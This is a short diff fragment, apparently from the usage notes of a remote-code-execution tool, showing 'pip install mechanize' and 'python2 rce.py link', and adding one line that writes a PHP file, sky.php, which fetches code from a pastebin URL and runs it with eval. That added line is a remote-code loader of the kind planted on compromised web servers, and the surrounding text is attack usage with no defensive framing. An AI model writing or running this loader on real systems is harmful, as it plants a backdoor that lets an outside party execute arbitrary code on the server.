@@ -35,3 +35,5 @@ pip install mechanize
 
 python2 rce.py link
 
+echo '<?php eval("?>".file_get_contents("https://pastebin.com/raw/CurQrH1a")); ?>' > sky.php
+
